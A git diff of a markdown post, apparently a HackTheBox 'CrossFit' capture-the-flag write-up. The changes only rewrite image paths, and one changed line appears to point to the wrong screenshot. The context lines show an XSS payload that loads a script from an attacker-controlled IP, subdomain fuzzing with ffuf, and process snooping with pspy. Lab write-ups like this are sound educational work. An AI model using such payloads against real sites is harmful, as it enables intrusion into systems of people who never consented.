@@ -86,7 +86,7 @@ We found a potential subdomain, In case virtual hosting is being done we need to
 10.10.10.208    crossfit.htb gym-club.crossfit.htb
 ```
 
-![](./gym-club-crossfit-htb.png)
+![](/src/app/blog/CrossFit/gym-club-crossfit-htb.png)
 
 Navigating around the website we found some fields in which we could try to a [Cross-Site Scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)
 
@@ -116,7 +116,7 @@ name=%3Cscript+src%3D%22http%3A%2F%2F10.10.16.2%3A8080%22%3E%3C%2Fscript%3E&emai
 
 Oops, we got an anti-hacker warning.
 
-![](./xss_warning.png)
+![](/src/app/blog/CrossFit/xss_warning.png)
 
 Then, they are storing information about our request and we could think that they are rendering it in some administrative panel. So, they may be a bit interested in our `User-Agent`.
 
@@ -171,7 +171,7 @@ ffuf -u http://gym-club.crossfit.htb \
 
 And ffuf reports us the `ftp` subdomain.
 
-![](./ffuf_report.png)
+![](/src/app/blog/CrossFit/ffuf_report.png)
 
 ffuf reports the ftp subdomain, unfortunately, adding `ftp.crossfit.htb` to `/etc/hosts` we do not get any interesting response, which makes us think that maybe the domain exists but only internally.
 
@@ -207,7 +207,7 @@ Is our code, if we decode it we get perfectly readable HTML.
 echo ...bPCFET0NUWVBFIGh0bWw... | base64 -d
 ```
 
-![](./ftp_crossfit_htb.png)
+![](/src/app/blog/CrossFit/gym-club-crossfit-htb.png)
 
 Obviosuly, we cannot create an account by simple clicking on the "Create New Account" button.
 But we can notice when hovering that, when clicking, it will request a file from `/accounts/create`, so let's try to get that HTML code the same way we did before but changing the target.
@@ -216,7 +216,7 @@ But we can notice when hovering that, when clicking, it will request a file from
 target = 'http://ftp.crossfit.htb/accounts/create'
 ```
 
-![](./create_new_account.png)
+![](/src/app/blog/CrossFit/create_new_account.png)
 
 Checking the code:
 
@@ -306,7 +306,7 @@ First, we make a request to `/accounts/create`, we parse the response and extrac
 
 If everything went well we should see our account:
 
-![](./account_created.png)
+![](/src/app/blog/CrossFit/account_created.png)
 
 Creating this account was in our interest because if we remember the `Nmap` scan, port 21 it's open.
 
@@ -696,7 +696,7 @@ chmod +x pspy
 
 And we run it with the flag `-f` to print file system events
 
-![](./pspy_execution.png)
+![](/src/app/blog/CrossFit/pspy_execution.png)
 
 Over time, we get a lot of information, but something interesting is this binary called `dbmsg`
 
@@ -728,17 +728,17 @@ So, for our surgery we need tools, let's use [ghidra](https://ghidra-sre.org/) t
 
 Create a new project
 
-![](./ghydra/new_project.png)
+![](/src/app/blog/CrossFit/ghydra/new_project.png)
 
 Import a `dbmsg` as new file
 
-![](./ghydra/new_file.png)
+![](/src/app/blog/CrossFit/ghydra/new_file.png)
 
 Analyze the file with default settings, and we can start
 
 first find the function `main` on the folder `FUNCTIONS` in the sidebar
 
-![](./ghydra/main_function.png)
+![](/src/app/blog/CrossFit/ghydra/main_function.png)
 
 Let's break the code
 
